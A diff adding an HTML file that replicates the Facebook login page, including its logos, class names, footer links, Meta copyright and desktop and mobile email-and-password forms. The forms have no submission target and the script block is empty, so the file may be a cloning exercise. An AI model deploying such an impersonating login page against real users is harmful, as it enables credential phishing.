@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - log in or sign up</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+    }
+
+    @media only screen and (max-width: 576px) {
+      .pc {
+        display: none;
+      }
+
+      .sm {
+        display: block;
+      }
+    }
+
+    @media only screen and (min-width: 576px) {
+      .pc {
+        display: block;
+      }
+
+      .sm {
+        display: none;
+      }
+    }
+
+    body {
+      background: #fff;
+      color: #1c1e21;
+      direction: ltr;
+      line-height: 1.34;
+      margin: 0px;
+      padding: 0px;
+      unicode-bidi: embed;
+    }
+
+    #globalContainer {
+      margin: 0 auto;
+      position: relative;
+    }
+
+    .fb_content {
+      min-height: 640px;
+      padding-bottom: 20px;
+    }
+
+    #content {
+      margin: 0;
+      outline: none;
+      padding: 0;
+      width: auto;
+    }
+
+    .form_wrapper_content {
+      padding-bottom: 112px;
+      padding-top: 72px;
+      background: #f2f4f7;
+      min-width: 500px;
+    }
+
+    .form_content {
+      margin: 0 auto;
+      padding: 20px 0;
+      position: relative;
+      width: 980px;
+    }
+
+    @media only screen and (max-width: 1075px) {
+      .form_content {
+        height: 496px;
+        margin: 0 40px;
+        width: auto;
+      }
+    }
+
+    .content_left {
+      box-sizing: border-box;
+      margin-right: 0;
+      padding-right: 32px;
+      width: 580px;
+      display: inline-block;
+      vertical-align: top;
+    }
+
+    @media only screen and (max-width: 1075px) {
+      .form_content {
+        display: flex;
+        flex-direction: column;
+        text-align: center;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .content_left {
+        width: auto;
+      }
+    }
+
+    .logo {
+      padding: 112px 0 16px;
+    }
+
+    .logo img {
+      height: 106px;
+      margin: -28px;
+    }
+
+    ._8eso {
+      font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+      font-size: 28px;
+      font-weight: normal;
+      line-height: 32px;
+      width: 500px;
+      padding: 0 0 20px;
+    }
+
+    .content_right {
+      display: inline-block;
+      vertical-align: top;
+    }
+
+    .form_right_content {
+      height: 456px;
+      width: 396px;
+    }
+
+    .form_right_content_inner {
+      padding-bottom: 24px;
+      padding-top: 10px;
+      text-align: center;
+      align-items: center;
+      background-color: #fff;
+      border: none;
+      border-radius: 8px;
+      box-shadow: 0px 2px 4px rgba(0, 0, 0, .1), 0px 8px 16px rgba(0, 0, 0, .1);
+      box-sizing: border-box;
+      margin: 40px 0 0;
+      padding: 20px 0 28px;
+      width: 396px;
+    }
+
+    ._6lux {
+      display: inline-block;
+      font-size: 14px;
+      margin: auto;
+      padding: 6px 0;
+      width: 302px;
+      font-size: 17px;
+      width: 364px;
+    }
+
+    input {
+      border-radius: 6px;
+      font-size: 17px;
+      padding: 14px 16px;
+      width: 330px;
+      background: #FFFFFF url(https://static.xx.fbcdn.net/rsrc.php/v4/yU/r/O7nelmd9XSI.png) repeat-x;
+      border: 1px solid #dddfe2;
+      color: #1d2129;
+      height: 22px;
+      line-height: 16px;
+      vertical-align: middle;
+    }
+
+    input:focus-visible {
+      border: 1px blue solid;
+      outline: none;
+    }
+
+    ._6ltg {
+      padding-top: 6px;
+    }
+
+    ._6ltg button {
+      background-color: #0866ff;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      line-height: 48px;
+      padding: 0 16px;
+      width: 332px;
+      color: #fff;
+      font-weight: bold;
+      box-sizing: content-box;
+      position: relative;
+      text-align: center;
+      text-shadow: none;
+      vertical-align: middle;
+      cursor: pointer;
+    }
+
+    ._6ltg a {
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      line-height: 48px;
+      padding: 0 16px;
+      background-color: #42b72a;
+      color: #fff;
+      box-sizing: content-box;
+      position: relative;
+      text-align: center;
+      text-shadow: none;
+      vertical-align: middle;
+      cursor: pointer;
+      display: inline-block;
+      text-decoration: none;
+      white-space: nowrap;
+      font-weight: bold;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    ._6ltj {
+      margin-top: 16px;
+    }
+
+    ._6ltj a {
+      color: #0866ff;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      font-weight: 500;
+      text-align: center;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    ._8icz {
+      align-items: center;
+      border-bottom: 1px solid #dadde1;
+      display: flex;
+      margin: 20px 16px;
+      text-align: center;
+    }
+
+    #reg_pages_msg {
+      border-top: none;
+      color: #1c1e21;
+      font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      font-weight: normal;
+      padding-top: 0;
+      margin-top: 28px;
+      text-align: center;
+    }
+
+    #reg_pages_msg a {
+      font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      color: inherit;
+      text-decoration: none;
+    }
+
+    ._8opy {
+      padding-top: 20px;
+    }
+
+    #pageFooter {
+      color: #737373;
+      margin: 0 auto;
+      width: 980px;
+    }
+
+    @media only screen and (max-width: 1075px) {
+      #pageFooter {
+        margin: 0 40px;
+        width: auto;
+      }
+    }
+
+    .localeSelectorList {
+      padding-top: 8px;
+      align-items: center;
+      display: flex;
+      flex-wrap: wrap;
+      list-style-type: none;
+      margin: 0px;
+      padding: 0px;
+    }
+
+    .localeSelectorList li:first-child {
+      padding-left: 0px;
+    }
+
+    .localeSelectorList li {
+      padding-left: 10px;
+      vertical-align: top;
+      border-width: 0 0 0 1px;
+      font-size: 12px;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .localeSelectorList li a {
+      margin-right: 0;
+      text-decoration: none;
+      white-space: nowrap;
+      color: #8a8d91;
+      cursor: pointer;
+    }
+
+    .localeSelectorList li a:hover {
+      text-decoration: underline;
+    }
+
+    #contentCurve {
+      border-bottom: 1px solid #dddfe2;
+      font-size: 1px;
+      height: 8px;
+      margin-bottom: 8px;
+    }
+
+
+
+    #pageFooterChildren {
+      color: #737373;
+    }
+
+    #pageFooter .pageFooterLinkList {
+      line-height: 1.3;
+      margin: 0px;
+      margin-left: -20px;
+      list-style-type: none;
+      padding: 0px;
+    }
+
+    .pageFooterLinkList li {
+      padding-right: 0px;
+      padding-left: 20px;
+      vertical-align: top;
+      border-width: 0;
+      display: inline-block;
+    }
+
+    .pageFooterLinkList li a {
+      color: #8a8d91;
+      font-family: Helvetica, Arial, sans-serif;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    #pageFooter .copyright {
+      font-size: 11px;
+      margin-top: 20px;
+      margin-bottom: 20px;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .sm {
+      height: 100dvh !important;
+    }
+
+    .sm_content {
+      padding: 15px;
+    }
+
+    .sm_content>p {
+      color: rgb(70, 90, 105);
+      font-weight: 400;
+      font-size: 13px;
+      font-family: Helvetica, Arial, sans-serif;
+      white-space: pre-wrap;
+      overflow-wrap: break-word;
+      text-align: center;
+    }
+
+    .sm_logo {
+      box-sizing: border-box;
+      display: flex;
+      flex: 0 1 auto;
+      flex-direction: row;
+      pointer-events: auto;
+      position: relative;
+      min-height: 0px;
+      min-width: 0px;
+      pointer-events: none;
+      margin-top: 0px;
+      margin-bottom: 20px;
+      flex-grow: 1;
+      flex-shrink: 100;
+      align-items: center;
+      justify-content: center;
+      height: 238px;
+    }
+
+    .sm_form ._9npi {
+      margin-top: 12px;
+    }
+
+    .sm_form button {
+      display: block;
+      margin-top: 12px;
+      height: 100%;
+      width: 100%;
+      background: rgb(0, 100, 224);
+      color: #fff;
+      outline: none;
+      border-radius: 22px;
+      height: 44px;
+      border: none;
+      font-weight: 500;
+      font-size: 16px;
+    }
+
+    .sm_forget_pass {
+      color: rgb(28, 43, 51);
+      font-weight: 500;
+      display: block;
+      font-size: 16px;
+      text-decoration: none;
+      text-align: center;
+      margin-top: 20px;
+      font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .sm_create_new_account {
+      margin-top: 220px;
+      display: flex;
+      justify-content: center;
+      border-radius: 22px;
+      border: 1px solid rgb(0, 100, 224);
+      height: 44px;
+      align-items: center;
+      text-decoration: none;
+      font-family: Helvetica, Arial, sans-serif;
+      color: rgb(0, 100, 224);
+      background: transparent;
+    }
+
+    .sm_logo_meta {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 20px;
+    }
+
+    .sm_about {
+      display: flex;
+      gap: 7px;
+      align-items: center;
+      justify-content: center;
+      margin-top: 15px;
+    }
+
+    .sm_about>* {
+      font-size: 11px;
+      color: rgb(99, 120, 138);
+    }
+
+    .sm_background {
+      background-image: radial-gradient(rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0) 40%), radial-gradient(rgb(255, 209, 82) 30%, rgb(226, 105, 150), rgba(226, 105, 150, 0.4) 41%, transparent 52%), radial-gradient(rgb(160, 51, 255) 37%, transparent 46%), linear-gradient(155deg, transparent 65%, rgb(37, 212, 102) 95%), linear-gradient(45deg, rgb(0, 101, 224), rgb(15, 139, 255));
+      background-position: left bottom, 109% 68%, 109% 68%, center center, center center;
+      background-repeat: no-repeat;
+      background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
+      inset: 0px;
+      opacity: 0.08;
+      pointer-events: none;
+      position: absolute;
+    }
+
+    .sm input {
+      width: 90%;
+    }
+
+    .sm_form form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+  </style>
+</head>
+
+<body>
+  <div style="font-family: inherit;" class="pc">
+    <div id="globalContainer" class="uiContextualLayerParent">
+      <div class="fb_content">
+        <div>
+          <div class="form_wrapper_content">
+            <div class="form_content">
+              <div class="content_left">
+                <div class="logo">
+                  <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
+                    alt="Facebook">
+                </div>
+
+                <h2 class="_8eso">Facebook helps you connect and share with the people in your life.</h2>
+              </div>
+
+              <div class="content_right">
+                <div class="form_right_content">
+                  <div class="form_right_content_inner">
+                    <form>
+                      <div>
+                        <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy" name="email" id="email"
+                            data-testid="royal-email" placeholder="Email address or phone number" autofocus="1"
+                            aria-label="Email address or phone number"></div>
+                        <div class="_6lux">
+                          <div class="_6luy _55r1 _1kbt" id="passContainer"><input type="password"
+                              class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal-pass"
+                              placeholder="Password" aria-label="Password">
+                          </div>
+                        </div>
+                      </div>
+
+                      <div class="_6ltg"><button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy"
+                          name="login" data-testid="royal-login-button" type="submit" id="u_0_5_zH">Log in</button>
+                      </div>
+
+                      <div class="_6ltj"><a
+                          href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+                          id="u_0_6_PK">Forgotten password?</a></div>
+
+                      <div class="_8icz"></div>
+
+                      <div class="_6ltg"><a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
+                          href="https://www.facebook.com/r.php?entry_point=login" ajaxify="" id="u_0_0_Dp"
+                          data-testid="open-registration-form-button">Create new account</a></div>
+                    </form>
+                  </div>
+
+                  <div id="reg_pages_msg" class="_58mk"><a
+                      href="https://www.facebook.com/pages/create/?ref_type=registration_form" class="_8esh">Create a
+                      Page</a> for a celebrity, brand or business.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="_8opy">
+          <div id="pageFooter">
+            <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+              <li>English (UK)</li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Vietnamese" id="u_0_7_EX">Tiếng
+                  Việt</a></li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Traditional Chinese (Taiwan)" id="u_0_8_qL">中文(台灣)</a></li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Korean" id="u_0_9_7G">한국어</a></li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Japanese" id="u_0_a_8Y">日本語</a>
+              </li>
+              <li><a class="_sv4" dir="ltr" href="#" title="French (France)" id="u_0_b_T0">Français (France)</a></li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Thai" id="u_0_c_0e">ภาษาไทย</a>
+              </li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Spanish" id="u_0_d_uW">Español</a>
+              </li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Portuguese (Brazil)" id="u_0_e_lH">Português (Brasil)</a>
+              </li>
+              <li><a class="_sv4" dir="ltr" href="#" title="German" id="u_0_f_2X">Deutsch</a>
+              </li>
+              <li><a class="_sv4" dir="ltr" href="#" title="Italian" id="u_0_g_ZT">Italiano</a></li>
+              <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog"
+                  ajaxify="/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2F&amp;source=www_list_selector_more"
+                  href="#" title="Show more languages"><i class="img sp_YbiIuPczOY_ sx_089752"></i></a></li>
+            </ul>
+
+            <div id="contentCurve"></div>
+            <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
+              <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                <li><a href="https://www.facebook.com/reg/" title="Sign up for Facebook">Sign Up</a></li>
+                <li><a href="https://www.facebook.com/login/" title="Log in to Facebook">Log in</a></li>
+                <li><a href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a></li>
+                <li><a href="https://www.facebook.com/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
+                <li><a href="https://www.facebook.com/watch/" title="Browse in Video">Video</a></li>
+                <li><a href="https://www.facebook.com/places/"
+                    title="Take a look at popular places on Facebook.">Places</a></li>
+                <li><a href="https://www.facebook.com/games/" title="Check out Facebook games.">Games</a></li>
+                <li><a href="https://www.facebook.com/marketplace/"
+                    title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
+                <li><a href="https://about.meta.com/technologies/meta-pay" title="Learn more about Meta Pay"
+                    target="_blank">Meta Pay</a></li>
+                <li><a href="https://www.meta.com/" title="Discover Meta" target="_blank">Meta Store</a></li>
+                <li><a href="https://www.meta.com/quest/" title="Learn more about Meta Quest" target="_blank">Meta
+                    Quest</a></li>
+                <li><a href="https://www.meta.com/smart-glasses/" title="Learn more about Ray-Ban Meta"
+                    target="_blank">Ray-Ban Meta</a></li>
+                <li><a href="https://www.meta.ai/" title="Meta AI">Meta AI</a></li>
+                <li><a
+                    href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT32ur8-sB-8kIeH07Att8WL6Z0FRiGT8DSBv1K4G41kG9HEOq04b2Nz5h-AzV7JDWlvtsPLA3Q_6E6FbzwqTkrL0wvmjfc61WMeltlQdKjeCe2DTvqWForijlYbEP7ULt_v5aECvIKlUlEnih87PA"
+                    title="Take a look at Instagram" target="_blank" rel="noreferrer nofollow"
+                    data-lynx-mode="asynclazy">Instagram</a></li>
+                <li><a href="https://www.threads.net/" title="Check out Threads">Threads</a></li>
+                <li><a href="https://www.facebook.com/fundraisers/" title="Donate to worthy causes.">Fundraisers</a>
+                </li>
+                <li><a href="https://www.facebook.com/biz/directory/"
+                    title="Browse our Facebook Services directory.">Services</a></li>
+                <li><a href="https://www.facebook.com/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
+                    title="See the Voting Information Centre">Voting Information Centre</a></li>
+                <li><a href="https://www.facebook.com/privacy/policy/?entry_point=facebook_page_footer"
+                    title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a></li>
+                <li><a href="https://www.facebook.com/privacy/center/?entry_point=facebook_page_footer"
+                    title="Learn how to manage and control your privacy on Facebook.">Privacy Centre</a></li>
+                <li><a href="https://www.facebook.com/groups/discover/" title="Explore our groups.">Groups</a></li>
+                <li><a href="https://about.meta.com/" accesskey="8"
+                    title="Read our blog, discover the resource centre and find job opportunities.">About</a></li>
+                <li><a
+                    href="https://www.facebook.com/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
+                    title="Advertise on Facebook">Create ad</a></li>
+                <li><a href="https://www.facebook.com/pages/create/?ref_type=site_footer" title="Create a Page">Create
+                    Page</a></li>
+                <li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a>
+                </li>
+                <li><a href="https://www.facebook.com/careers/?ref=pf"
+                    title="Make your next career move to our brilliant company.">Careers</a>
+                </li>
+                <li><a href="https://www.facebook.com/policies/cookies/" title="Learn about cookies and Facebook."
+                    data-nocookies="1">Cookies</a></li>
+                <li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217"
+                    title="Learn about Ad Choices.">AdChoices<i class="img sp_YbiIuPczOY_ sx_b2cf63"></i></a></li>
+                <li><a data-nocookies="1" href="https://www.facebook.com/policies?ref=pf" accesskey="9"
+                    title="Review our terms and policies.">Terms</a></li>
+                <li><a href="https://www.facebook.com/help/?ref=pf" accesskey="0"
+                    title="Visit our Help Centre.">Help</a></li>
+                <li><a href="https://www.facebook.com/help/637205020878504"
+                    title="Visit our contact uploading and non-users notice.">Contact uploading and non-users</a></li>
+                <li><a accesskey="6" class="accessible_elem" href="https://www.facebook.com/settings"
+                    title="View and edit your Facebook settings.">Settings</a></li>
+                <li><a accesskey="7" class="accessible_elem"
+                    href="https://www.facebook.com/allactivity?privacy_source=activity_log_top_menu"
+                    title="View your activity log">Activity log</a></li>
+              </ul>
+            </div>
+
+            <div class="mvl copyright">
+              <div><span> Meta © 2025</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sm">
+    <div class="sm_background"></div>
+    <div class="sm_content">
+      <p>English (UK)</p>
+
+      <div class="sm_logo">
+        <img data-bloks-name="bk.components.Image" role="heading" alt="Facebook from Meta" class="wbloks_1"
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/768px-Facebook_Logo_%282019%29.png"
+          style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
+      </div>
+
+      <div class="sm_form">
+        <form>
+          <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal-email"
+            placeholder="Mobile number or email address" autofocus="1" aria-label="Mobile number or email address">
+          <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal-pass"
+            placeholder="Password" aria-label="Password">
+
+          <button>Log in</button>
+
+          <a class="sm_forget_pass" href="https://m.facebook.com/login/identify/">Forgotten Password?</a>
+        </form>
+
+        <a class="sm_create_new_account" href="https://m.facebook.com/reg/">Create new account</a>
+
+        <div class="sm_logo_meta">
+          <img data-bloks-name="bk.components.Image" alt="Meta logo" class="wbloks_1"
+            src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png"
+            style="height: 12px; width: 60px; pointer-events: inherit; mask-image: url(&quot;https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png&quot;); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
+        </div>
+
+        <div class="sm_about">
+          <p>About</p>
+          <p>Help</p>
+          <p>More</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+
+<script>
+  
+</script>
+</html>
